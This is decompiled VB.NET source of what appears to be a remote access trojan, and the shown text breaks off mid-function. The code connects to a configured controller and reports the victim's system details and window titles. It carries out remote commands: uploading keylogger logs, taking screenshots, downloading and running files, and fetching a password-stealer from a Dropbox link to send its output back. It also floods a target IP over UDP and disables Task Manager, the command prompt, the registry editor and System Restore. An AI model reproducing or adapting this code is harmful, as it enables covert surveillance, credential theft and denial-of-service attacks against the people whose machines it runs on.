Imports System
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.VisualBasic.Devices
Imports Microsoft.Win32
Imports w.My

Namespace w
	' Token: 0x02000008 RID: 8
	Public Class OK
		' Token: 0x06000014 RID: 20 RVA: 0x000023A4 File Offset: 0x000005A4
		<DebuggerNonUserCode()>
		Public Sub New()
		End Sub

		' Token: 0x06000015 RID: 21 RVA: 0x000023AE File Offset: 0x000005AE
		Private Shared Sub im(a0 As Object)
			OK.Ind(CType(a0, Byte()))
		End Sub

		' Token: 0x06000016 RID: 22 RVA: 0x000023BE File Offset: 0x000005BE
		Private Shared Sub im(a0 As Object, a1 As SessionEndingEventArgs)
			OK.ED()
		End Sub

		' Token: 0x06000017 RID: 23 RVA: 0x000023C8 File Offset: 0x000005C8
		Public Shared Function ACT() As String
			Dim text2 As String
			Try
				Dim foregroundWindow As IntPtr = OK.GetForegroundWindow()
				Dim flag As Boolean = foregroundWindow = IntPtr.Zero
				If flag Then
					Return ""
				End If
				Dim text As String = Strings.Space(OK.GetWindowTextLength(CLng(foregroundWindow)) + 1)
				OK.GetWindowText(foregroundWindow, text, text.Length)
				text2 = OK.ENB(text)
			Catch ex As Exception
				text2 = ""
			End Try
			Return text2
		End Function

		' Token: 0x06000018 RID: 24 RVA: 0x00002450 File Offset: 0x00000650
		Public Shared Function BS(ByRef B As Byte()) As String
			Return Encoding.UTF8.GetString(B)
		End Function

		' Token: 0x06000019 RID: 25 RVA: 0x00002470 File Offset: 0x00000670
		Public Shared Function Cam() As Boolean
			' The following expression was wrapped in a checked-statement
			Try
				Dim num As Integer = 0
				While True
					Dim num2 As Short = CShort(num)
					Dim text As String = Strings.Space(100)
					Dim num3 As Integer = 100
					Dim text2 As String = Nothing
					Dim flag As Boolean = OK.capGetDriverDescriptionA(num2, text, num3, text2, 100)
					If flag Then
						Exit For
					End If
					num += 1
					If num > 4 Then
						GoTo Block_3
					End If
				End While
				Return True
				Block_3:
			Catch ex As Exception
			End Try
			Return False
		End Function

		' Token: 0x0600001A RID: 26
		Public Declare Ansi Function GetForegroundWindow Lib "user32.dll" () As IntPtr

		' Token: 0x0600001B RID: 27
		Private Declare Ansi Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpRootPathName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpVolumeNameBuffer As String, nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpFileSystemNameBuffer As String, nFileSystemNameSize As Integer) As Integer

		' Token: 0x0600001C RID: 28
		Public Declare Ansi Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (hWnd As IntPtr, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef WinTitle As String, MaxLength As Integer) As Integer

		' Token: 0x0600001D RID: 29
		Public Declare Ansi Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (hwnd As Long) As Integer

		' Token: 0x0600001E RID: 30
		Public Declare Ansi Function capGetDriverDescriptionA Lib "avicap32.dll" (wDriver As Short, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszName As String, cbName As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszVer As String, cbVer As Integer) As Boolean

		' Token: 0x0600001F RID: 31 RVA: 0x000024E4 File Offset: 0x000006E4
		Private Shared Function CompDir(F1 As FileInfo, F2 As FileInfo) As Boolean
			Dim flag As Boolean = Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), False) = 0
			If flag Then
				Dim directoryInfo As DirectoryInfo = F1.Directory
				Dim directoryInfo2 As DirectoryInfo = F2.Directory
				While True
					flag = Operators.CompareString(directoryInfo.Name.ToLower(), directoryInfo2.Name.ToLower(), False) <> 0
					If flag Then
						Exit For
					End If
					directoryInfo = directoryInfo.Parent
					directoryInfo2 = directoryInfo2.Parent
					flag = (directoryInfo Is Nothing) And (directoryInfo2 Is Nothing)
					If flag Then
						GoTo Block_3
					End If
					flag = directoryInfo Is Nothing
					If flag Then
						GoTo Block_4
					End If
					If directoryInfo2 Is Nothing Then
						GoTo IL_96
					End If
				End While
				Return False
				Block_3:
				Return True
				Block_4:
				Return False
			End If
			IL_96:
			Return False
		End Function

		' Token: 0x06000020 RID: 32 RVA: 0x00002590 File Offset: 0x00000790
		Public Shared Function connect() As Boolean
			OK.Cn = False
			Thread.Sleep(2000)
			Dim lo As FileInfo = OK.LO
			Dim fileInfo As FileInfo = lo
			SyncLock fileInfo
				Try
					Dim flag As Boolean = OK.C IsNot Nothing
					If flag Then
						Try
							OK.C.Close()
							OK.C = Nothing
						Catch ex As Exception
						End Try
					End If
					Try
						OK.MeM.Dispose()
					Catch ex2 As Exception
					End Try
				Catch ex3 As Exception
				End Try
				Try
					OK.MeM = New MemoryStream()
					OK.C = New TcpClient()
					OK.C.ReceiveBufferSize = 204800
					OK.C.SendBufferSize = 204800
					OK.C.Client.SendTimeout = 10000
					OK.C.Client.ReceiveTimeout = 10000
					NewLateBinding.LateCall(OK.C, Nothing, "Connect", New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.MH(OK.HH)))), Conversions.ToInteger(OK.P) }, Nothing, Nothing, Nothing, True)
					OK.H = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.MH(OK.HH)))
					OK.Cn = True
					OK.Send(OK.inf())
					Try
						Dim flag As Boolean = Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(OK.GTV("vn", "")), "", False)
						Dim text As String
						If flag Then
							text = text + OK.DEB(OK.VN) + vbCrLf
						Else
							Dim text2 As String = text
							Dim text3 As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV("vn", "")))
							text = text2 + OK.DEB(text3) + vbCrLf
						End If
						text = String.Concat(New String() { String.Concat(New String() { text, OK.H, ":", OK.P, vbCrLf }), OK.DR, vbCrLf, OK.EXE, vbCrLf, Conversions.ToString(OK.Idr), vbCrLf, Conversions.ToString(OK.IsF), vbCrLf, Conversions.ToString(OK.Isu), vbCrLf, Conversions.ToString(OK.BD), vbCrLf, Conversions.ToString(OK.HD), vbCrLf, Conversions.ToString(OK.usb), vbCrLf, Conversions.ToString(OK.anti2), vbCrLf, Conversions.ToString(OK.task) })
						OK.Send("inf" + OK.Y + OK.ENB(text))
					Catch ex4 As Exception
					End Try
				Catch ex5 As Exception
					OK.Cn = False
				End Try
			End SyncLock
			Return OK.Cn
		End Function

		' Token: 0x06000021 RID: 33 RVA: 0x000029B0 File Offset: 0x00000BB0
		Public Shared Function DEB(ByRef s As String) As String
			Dim array As Byte() = Convert.FromBase64String(s)
			Return OK.BS(array)
		End Function

		' Token: 0x06000022 RID: 34 RVA: 0x000029D4 File Offset: 0x00000BD4
		Public Shared Sub DLV(n As String)
			Try
				OK.F.Registry.CurrentUser.OpenSubKey("Software\" + OK.RG, True).DeleteValue(n)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000023 RID: 35 RVA: 0x00002A34 File Offset: 0x00000C34
		Public Shared Sub ED()
			OK.pr(0)
		End Sub

		' Token: 0x06000024 RID: 36 RVA: 0x00002A40 File Offset: 0x00000C40
		Public Shared Function ENB(ByRef s As String) As String
			Return Convert.ToBase64String(OK.SB(s))
		End Function

		' Token: 0x06000025 RID: 37 RVA: 0x00002A60 File Offset: 0x00000C60
		Public Shared Function GTV(n As String, ret As Object) As Object
			Dim obj As Object
			Try
				obj = OK.F.Registry.CurrentUser.OpenSubKey("Software\" + OK.RG).GetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ret))))
			Catch ex As Exception
				obj = ret
			End Try
			Return obj
		End Function

		' Token: 0x06000026 RID: 38 RVA: 0x00002ADC File Offset: 0x00000CDC
		Public Shared Function HWD() As String
			Dim text4 As String
			Try
				Dim text As String = Interaction.Environ("SystemDrive") + "\"
				Dim text2 As String = Nothing
				Dim num As Integer = 0
				Dim num2 As Integer = 0
				Dim num3 As Integer = 0
				Dim text3 As String = Nothing
				Dim num4 As Integer
				OK.GetVolumeInformation(text, text2, num, num4, num2, num3, text3, 0)
				text4 = Conversion.Hex(num4)
			Catch ex As Exception
				text4 = "ERR"
			End Try
			Return text4
		End Function

		' Token: 0x06000027 RID: 39 RVA: 0x00002B68 File Offset: 0x00000D68
		Public Shared Function MH(H As String) As Object
			Dim array As String() = Strings.Split(H, ",", -1, CompareMethod.Binary)
			Dim flag As Boolean = OK.NH >= array.Length
			If flag Then
				OK.NH = 0
			End If
			Return array(OK.NH)
		End Function

		' Token: 0x06000028 RID: 40
		Public Declare Ansi Function apiBlockInput Lib "user32" Alias "BlockInput" (fBlock As Integer) As Integer

		' Token: 0x06000029 RID: 41
		Public Declare Ansi Function SwapMouseButton Lib "user32" (bSwap As Long) As Long

		' Token: 0x0600002A RID: 42
		Private Declare Auto Sub SendMessage Lib "user32.dll" (hWnd As Integer, msg As UInteger, wParam As UInteger, lparam As Integer)

		' Token: 0x0600002B RID: 43
		Private Declare Ansi Function SetWindowPos Lib "user32" (hwnd As Integer, hWndInsertAfter As Integer, x As Integer, y As Integer, cx As Integer, cy As Integer, wFlags As Integer) As Integer

		' Token: 0x0600002C RID: 44
		Public Declare Ansi Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpCommandString As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpReturnString As String, uReturnLength As Long, hwndCallback As Long) As Long

		' Token: 0x0600002D RID: 45
		Public Declare Sub Beep Lib "KERNEL32.DLL" (freq As Integer, dur As Integer)

		' Token: 0x0600002E RID: 46 RVA: 0x00002BA8 File Offset: 0x00000DA8
		Public Shared Sub AddHome(text As String)
			Dim registryKey As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Internet Explorer\Main", True)
			registryKey.SetValue("Start Page", text)
		End Sub

		' Token: 0x0600002F RID: 47 RVA: 0x00002BD8 File Offset: 0x00000DD8
		<MethodImpl(MethodImplOptions.NoInlining)>
		Public Shared Sub Ind(b As Byte())
			Dim array As String() = Strings.Split(OK.BS(b), OK.Y, -1, CompareMethod.Binary)
			Try
				Dim text As String = array(0)
				Dim text2 As String = text
				Dim flag As Boolean = Operators.CompareString(text2, "nwpr", False) = 0
				Dim flag2 As Boolean
				If flag Then
					Process.Start(array(1))
				Else
					flag = Operators.CompareString(text2, "site", False) = 0
					If flag Then
						OK.Send("site")
					Else
						flag = Operators.CompareString(text2, "fun", False) = 0
						If flag Then
							OK.Send("fun")
						Else
							flag = Operators.CompareString(text2, "IEhome", False) = 0
							If flag Then
								OK.AddHome(array(1))
							Else
								flag = Operators.CompareString(text2, "shutdowncomputer", False) = 0
								If flag Then
									Interaction.Shell("shutdown -s -t 00", AppWinStyle.Hide, False, -1)
								Else
									flag = Operators.CompareString(text2, "restartcomputer", False) = 0
									If flag Then
										Interaction.Shell("shutdown -r -t 00", AppWinStyle.Hide, False, -1)
									Else
										flag = Operators.CompareString(text2, "logoff", False) = 0
										If flag Then
											Interaction.Shell("shutdown -l -t 00", AppWinStyle.Hide, False, -1)
										Else
											flag = Operators.CompareString(text2, "ErorrMsg", False) = 0
											If flag Then
												Dim text3 As String = array(1)
												flag2 = Operators.CompareString(text3, "1", False) = 0
												Dim messageBoxIcon As MessageBoxIcon
												If flag2 Then
													messageBoxIcon = MessageBoxIcon.Asterisk
												Else
													flag2 = Operators.CompareString(text3, "2", False) = 0
													If flag2 Then
														messageBoxIcon = MessageBoxIcon.Question
													Else
														flag2 = Operators.CompareString(text3, "3", False) = 0
														If flag2 Then
															messageBoxIcon = MessageBoxIcon.Exclamation
														Else
															flag2 = Operators.CompareString(text3, "4", False) = 0
															If flag2 Then
																messageBoxIcon = MessageBoxIcon.Hand
															End If
														End If
													End If
												End If
												Dim text4 As String = array(2)
												flag2 = Operators.CompareString(text4, "1", False) = 0
												Dim messageBoxButtons As MessageBoxButtons
												If flag2 Then
													messageBoxButtons = MessageBoxButtons.YesNo
												Else
													flag2 = Operators.CompareString(text4, "2", False) = 0
													If flag2 Then
														messageBoxButtons = MessageBoxButtons.YesNoCancel
													Else
														flag2 = Operators.CompareString(text4, "3", False) = 0
														If flag2 Then
															messageBoxButtons = MessageBoxButtons.OK
														Else
															flag2 = Operators.CompareString(text4, "4", False) = 0
															If flag2 Then
																messageBoxButtons = MessageBoxButtons.OKCancel
															Else
																flag2 = Operators.CompareString(text4, "5", False) = 0
																If flag2 Then
																	messageBoxButtons = MessageBoxButtons.RetryCancel
																Else
																	flag2 = Operators.CompareString(text4, "6", False) = 0
																	If flag2 Then
																		messageBoxButtons = MessageBoxButtons.AbortRetryIgnore
																	End If
																End If
															End If
														End If
													End If
												End If
												MessageBox.Show(array(4), array(3), messageBoxButtons, messageBoxIcon)
											Else
												flag2 = Operators.CompareString(text2, "peech", False) = 0
												If flag2 Then
													Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice", ""))
													Dim obj As Object = objectValue
													Dim type As Type = Nothing
													Dim text5 As String = "speak"
													Dim array2 As Object() = New Object(0) {}
													Dim array3 As Object() = array2
													Dim num As Integer = 0
													Dim array4 As String() = array
													Dim array5 As String() = array4
													Dim num2 As Integer = 1
													array3(num) = array5(num2)
													Dim array6 As Object() = array2
													Dim array7 As Object() = array6
													Dim array8 As String() = Nothing
													Dim array9 As Type() = Nothing
													Dim array10 As Boolean() = New Boolean() { True }
													NewLateBinding.LateCall(obj, type, text5, array7, array8, array9, array10, True)
													If array10(0) Then
														array4(num2) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6(0)), GetType(String)))
													End If
												Else
													flag2 = Operators.CompareString(text2, "BepX", False) = 0
													If flag2 Then
														OK.Beep(CInt(Math.Round(Conversion.Val(array(1)))), CInt(Math.Round(Conversion.Val(array(2)))))
													Else
														flag2 = Operators.CompareString(text2, "piano", False) = 0
														If flag2 Then
															OK.Beep(CInt(Math.Round(Conversion.Val(array(1)))), 300)
														Else
															flag2 = Operators.CompareString(text2, "OpenCD", False) = 0
															If flag2 Then
																Dim text6 As String = "set CDAudio door open"
																Dim text7 As String = ""
																OK.mciSendString(text6, text7, 0L, 0L)
															Else
																flag2 = Operators.CompareString(text2, "CloseCD", False) = 0
																If flag2 Then
																	Dim text7 As String = "set CDAudio door closed"
																	Dim text6 As String = ""
																	OK.mciSendString(text7, text6, 0L, 0L)
																Else
																	flag2 = Operators.CompareString(text2, "DisableKM", False) = 0
																	If flag2 Then
																		OK.apiBlockInput(1)
																	Else
																		flag2 = Operators.CompareString(text2, "EnableKM", False) = 0
																		If flag2 Then
																			OK.apiBlockInput(0)
																		Else
																			flag2 = Operators.CompareString(text2, "TurnOffMonitor", False) = 0
																			If flag2 Then
																				OK.SendMessage(-1, 274UI, 61808UI, 2)
																			Else
																				flag2 = Operators.CompareString(text2, "TurnOnMonitor", False) = 0
																				If flag2 Then
																					OK.SendMessage(-1, 274UI, 61808UI, -1)
																				Else
																					flag2 = Operators.CompareString(text2, "NormalMouse", False) = 0
																					If flag2 Then
																						OK.SwapMouseButton(0L)
																					Else
																						flag2 = Operators.CompareString(text2, "ReverseMouse", False) = 0
																						If flag2 Then
																							OK.SwapMouseButton(256L)
																						Else
																							flag2 = Operators.CompareString(text2, "DisableCMD", False) = 0
																							If flag2 Then
																								MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", RegistryValueKind.DWord)
																							Else
																								flag2 = Operators.CompareString(text2, "EnableCMD", False) = 0
																								If flag2 Then
																									MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "0", RegistryValueKind.DWord)
																								Else
																									flag2 = Operators.CompareString(text2, "DisableRegistry", False) = 0
																									If flag2 Then
																										MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", RegistryValueKind.DWord)
																									Else
																										flag2 = Operators.CompareString(text2, "EnableRegistry", False) = 0
																										If flag2 Then
																											MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "0", RegistryValueKind.DWord)
																										Else
																											flag2 = Operators.CompareString(text2, "DisableRestore", False) = 0
																											If flag2 Then
																												MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "1", RegistryValueKind.DWord)
																											Else
																												flag2 = Operators.CompareString(text2, "EnableRestore", False) = 0
																												If flag2 Then
																													MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "0", RegistryValueKind.DWord)
																												Else
																													flag2 = Operators.CompareString(text2, "DisableTaskManager", False) = 0
																													If flag2 Then
																														MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", RegistryValueKind.DWord)
																													Else
																														flag2 = Operators.CompareString(text2, "EnableTaskManager", False) = 0
																														If flag2 Then
																															MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "0", RegistryValueKind.DWord)
																														Else
																															flag2 = Operators.CompareString(text2, "CursorShow", False) = 0
																															If flag2 Then
																																Cursor.Show()
																															Else
																																flag2 = Operators.CompareString(text2, "CursorHide", False) = 0
																																If flag2 Then
																																	Cursor.Hide()
																																Else
																																	flag2 = Operators.CompareString(text2, "sendmusicplay", False) = 0
																																	If flag2 Then
																																		File.WriteAllBytes(Path.GetTempPath() + array(1), Convert.FromBase64String(array(2)))
																																		Thread.Sleep(1000)
																																		MyProject.Computer.Audio.[Stop]()
																																		MyProject.Computer.Audio.Play(Path.GetTempPath() + array(1), AudioPlayMode.Background)
																																	Else
																																		flag2 = Operators.CompareString(text2, "OpenSite", False) = 0
																																		If flag2 Then
																																			Process.Start(array(1))
																																		Else
																																			flag2 = Operators.CompareString(text2, "dos", False) = 0
																																			If flag2 Then
																																				OK.Send("dos")
																																			Else
																																				flag2 = Operators.CompareString(text2, "udp", False) = 0
																																				If flag2 Then
																																					OK.Send("udp")
																																					OK.TIP = array(1)
																																					OK.Tport = array(2)
																																					OK.delay = Conversions.ToInteger(array(3))
																																					OK.udp = True
																																					Try
																																						While True
																																							flag2 = Not OK.udp
																																							If flag2 Then
																																								Exit For
																																							End If
																																							Try
																																								Dim ipendPoint As IPEndPoint = New IPEndPoint(IPAddress.Parse(OK.TIP), Conversions.ToInteger(OK.Tport))
																																								Dim array11 As Byte() = New Byte(4095) {}
																																								Dim socket As Socket = New Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
																																								socket.SendTo(array11, ipendPoint)
																																								Thread.Sleep(OK.delay)
																																							Catch ex As Exception
																																							End Try
																																						End While
																																					Catch ex2 As Exception
																																					End Try
																																				Else
																																					flag2 = Operators.CompareString(text2, "udpstp", False) = 0
																																					If flag2 Then
																																						OK.udp = False
																																					Else
																																						flag2 = Operators.CompareString(text2, "pingstop", False) = 0
																																						If flag2 Then
																																							Interaction.Shell("taskkill /F /IM PING.EXE", AppWinStyle.Hide, False, -1)
																																						Else
																																							flag2 = Operators.CompareString(text2, "ll", False) = 0
																																							If flag2 Then
																																								OK.Cn = False
																																								Return
																																							End If
																																							flag2 = Operators.CompareString(text2, "kl", False) = 0
																																							If flag2 Then
																																								OK.Send("kl" + OK.Y + OK.ENB(OK.kq.Logs))
																																								Return
																																							End If
																																							flag2 = Operators.CompareString(text2, "pas", False) = 0
																																							If flag2 Then
																																								Try
																																									Dim text8 As String = Interaction.Environ("temp") + "/pass.exe"
																																									flag2 = File.Exists(text8)
																																									If Not flag2 Then
																																										Try
																																											Dim webClient As WebClient = New WebClient()
																																											webClient.DownloadFile("https://dl.dropbox.com/s/p84aaz28t0hepul/Pass.exe?dl=0", text8)
																																											Process.Start(text8)
																																										Catch ex3 As Exception
																																										End Try
																																									End If
																																								Catch ex4 As Exception
																																								End Try
																																								Try
																																									Dim text9 As String = Interaction.Environ("temp") + "/temp.txt"
																																									Dim text10 As String = File.ReadAllText(text9)
																																									OK.Send("pas" + OK.Y + OK.ENB(text10))
																																								Catch ex5 As Exception
																																								End Try
																																								Return
																																							End If
																																							flag2 = Operators.CompareString(text2, "ll", False) = 0
																																							If flag2 Then
																																								OK.Cn = False
																																								Return
																																							End If
																																							flag2 = Operators.CompareString(text2, "kl", False) = 0
																																							If flag2 Then
																																								OK.Send("kl" + OK.Y + OK.ENB(OK.kq.Logs))
																																								Return
																																							End If
																																							flag2 = Operators.CompareString(text2, "prof", False) = 0
																																							If flag2 Then
																																								Dim text11 As String = array(1)
																																								flag = Operators.CompareString(text11, "~", False) = 0
																																								If flag Then
																																									OK.STV(array(2), array(3), RegistryValueKind.[String])
																																								Else
																																									flag2 = Operators.CompareString(text11, "!", False) = 0
																																									If flag2 Then
																																										OK.STV(array(2), array(3), RegistryValueKind.[String])
																																										OK.Send(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("getvalue" + OK.Y + array(1) + OK.Y, RuntimeHelpers.GetObjectValue(OK.GTV(array(1), ""))))))
																																									Else
																																										flag2 = Operators.CompareString(text11, "@", False) = 0
																																										If flag2 Then
																																											OK.DLV(array(2))
																																										End If
																																									End If
																																								End If
																																								Return
																																							End If
																																						End If
																																					End If
																																				End If
																																			End If
																																		End If
																																	End If
																																End If
																															End If
																														End If
																													End If
																												End If
																											End If
																										End If
																									End If
																								End If
																							End If
																						End If
																					End If
																				End If
																			End If
																		End If
																	End If
																End If
															End If
														End If
													End If
												End If
											End If
										End If
									End If
								End If
							End If
						End If
					End If
				End If
				flag2 = Operators.CompareString(text, "rn", False) <> 0
				If Not flag2 Then
					flag2 = array(2)(0) = ChrW(31)
					Dim array12 As Byte()
					If flag2 Then
						Try
							Dim memoryStream As MemoryStream = New MemoryStream()
							Dim length As Integer = (array(0) + OK.Y + array(1) + OK.Y).Length
							memoryStream.Write(b, length, b.Length - length)
							array12 = OK.ZIP(memoryStream.ToArray())
							GoTo IL_CF6
						Catch ex6 As Exception
							OK.Send("MSG" + OK.Y + "Execute ERROR")
							OK.Send("bla")
							Return
						End Try
					End If
					Dim webClient2 As WebClient = New WebClient()
					Try
						array12 = webClient2.DownloadData(array(2))
					Catch ex7 As Exception
						OK.Send("MSG" + OK.Y + "Download ERROR")
						OK.Send("bla")
						Return
					End Try
					IL_CF6:
					OK.Send("bla")
					Dim text12 As String = Path.GetTempFileName() + "." + array(1)
					Try
						File.WriteAllBytes(text12, array12)
						Process.Start(text12)
						OK.Send("MSG" + OK.Y + "Executed As " + New FileInfo(text12).Name)
						Return
					Catch ex8 As Exception
						Dim ex9 As Exception = ex8
						OK.Send("MSG" + OK.Y + "Execute ERROR " + ex9.Message)
						Return
					End Try
				End If
				Dim text13 As String = text
				flag2 = Operators.CompareString(text13, "inv", False) = 0
				If flag2 Then
					Dim array13 As Byte() = CType(OK.GTV(array(1), New Byte(-1) {}), Byte())
					flag2 = (array(3).Length < 10) And (array13.Length = 0)
					If flag2 Then
						OK.Send(String.Concat(New String() { "pl", OK.Y, array(1), OK.Y, Conversions.ToString(1) }))
					Else
						flag2 = array(3).Length > 10
						If flag2 Then
							Dim memoryStream2 As MemoryStream = New MemoryStream()
							Dim length2 As Integer = String.Concat(New String() { array(0), OK.Y, array(1), OK.Y, array(2), OK.Y }).Length
							memoryStream2.Write(b, length2, b.Length - length2)
							array13 = OK.ZIP(memoryStream2.ToArray())
							OK.STV(array(1), array13, RegistryValueKind.Binary)
						End If
						OK.Send(String.Concat(New String() { "pl", OK.Y, array(1), OK.Y, Conversions.ToString(0) }))
						Dim objectValue2 As Object = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(array13, "A"))))
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue2), Nothing, "h", New Object() { OK.H }, Nothing, Nothing)
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue2), Nothing, "p", New Object() { OK.P }, Nothing, Nothing)
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue2), Nothing, "osk", New Object() { array(2) }, Nothing, Nothing)
						NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue2), Nothing, "start", New Object(-1) {}, Nothing, Nothing, Nothing, True)
						While Not Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(Operators.OrObject(Not OK.Cn, RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue2), Nothing, "Off", New Object(-1) {}, Nothing, Nothing, Nothing)), True, False)))))
							Thread.Sleep(1)
						End While
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue2), Nothing, "off", New Object() { True }, Nothing, Nothing)
					End If
				Else
					flag2 = Operators.CompareString(text13, "ret", False) = 0
					If flag2 Then
						Dim array14 As Byte() = CType(OK.GTV(array(1), New Byte(-1) {}), Byte())
						flag2 = (array(2).Length < 10) And (array14.Length = 0)
						If flag2 Then
							OK.Send(String.Concat(New String() { "pl", OK.Y, array(1), OK.Y, Conversions.ToString(1) }))
						Else
							flag2 = array(2).Length > 10
							If flag2 Then
								Dim memoryStream3 As MemoryStream = New MemoryStream()
								Dim length3 As Integer = (array(0) + OK.Y + array(1) + OK.Y).Length
								memoryStream3.Write(b, length3, b.Length - length3)
								array14 = OK.ZIP(memoryStream3.ToArray())
								OK.STV(array(1), array14, RegistryValueKind.Binary)
							End If
							OK.Send(String.Concat(New String() { "pl", OK.Y, array(1), OK.Y, Conversions.ToString(0) }))
							Dim objectValue3 As Object = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(array14, "A"))))
							Dim array4 As String() = New String(4) {}
							array4(0) = "ret"
							array4(1) = OK.Y
							array4(2) = array(1)
							array4(3) = OK.Y
							Dim array15 As String() = array4
							Dim num3 As Integer = 4
							Dim text7 As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue3), Nothing, "GT", New Object(-1) {}, Nothing, Nothing, Nothing)))
							array15(num3) = OK.ENB(text7)
							OK.Send(String.Concat(array4))
						End If
					Else
						flag2 = Operators.CompareString(text13, "CAP", False) = 0
						If flag2 Then
							Dim bounds As Rectangle = Screen.PrimaryScreen.Bounds
							Dim bitmap As Bitmap = New Bitmap(Screen.PrimaryScreen.Bounds.Width, bounds.Height, PixelFormat.Format16bppRgb555)
							Dim graphics As Graphics = Graphics.FromImage(bitmap)
							Dim size As Size = New Size(bitmap.Width, bitmap.Height)
							graphics.CopyFromScreen(0, 0, 0, 0, size, CopyPixelOperation.SourceCopy)
							Try
								size = New Size(32, 32)
								bounds = New Rectangle(Cursor.Position, size)
								Cursors.[Default].Draw(graphics, bounds)
							Catch ex10 As Exception
							End Try
							graphics.Dispose()
							Dim bitmap2 As Bitmap = New Bitmap(Conversions.ToInteger(array(1)), Conversions.ToInteger(array(2)))
							graphics = Graphics.FromImage(bitmap2)
							graphics.DrawImage(bitmap, 0, 0, bitmap2.Width, bitmap2.Height)
							graphics.Dispose()
							Dim memoryStream4 As MemoryStream = New MemoryStream()
							Dim text7 As String = "CAP" + OK.Y
							b = OK.SB(text7)
							memoryStream4.Write(b, 0, b.Length)
							Dim memoryStream5 As MemoryStream = New MemoryStream()
							bitmap2.Save(memoryStream5, ImageFormat.Jpeg)
							Dim text14 As String = OK.md5(memoryStream5.ToArray())
							flag2 = Operators.CompareString(text14, OK.lastcap, False) <> 0
							If flag2 Then
								OK.lastcap = text14
								memoryStream4.Write(memoryStream5.ToArray(), 0, CInt(memoryStream5.Length))
							Else
								memoryStream4.WriteByte(0)
							End If
							OK.Sendb(memoryStream4.ToArray())
							memoryStream4.Dispose()
							memoryStream5.Dispose()
							bitmap.Dispose()
							bitmap2.Dispose()
						Else
							flag2 = Operators.CompareString(text13, "un", False) = 0
							If flag2 Then
								Dim text15 As String = array(1)
								flag = Operators.CompareString(text15, "~", False) = 0
								If flag Then
									OK.UNS()
								Else
									flag2 = Operators.CompareString(text15, "!", False) = 0
									If flag2 Then
										OK.pr(0)
										ProjectData.EndApp()
									Else
										flag2 = Operators.CompareString(text15, "@", False) = 0
										If flag2 Then
											OK.pr(0)
											Process.Start(OK.LO.FullName)
											ProjectData.EndApp()
										End If
									End If
								End If
							Else
								flag2 = Operators.CompareString(text, "up", False) <> 0
								If flag2 Then
									flag2 = Operators.CompareString(text, "Ex", False) = 0
									If flag2 Then
										flag = OK.PLG Is Nothing
										If flag Then
											OK.Send("PLG")
											Dim num4 As Integer = 0
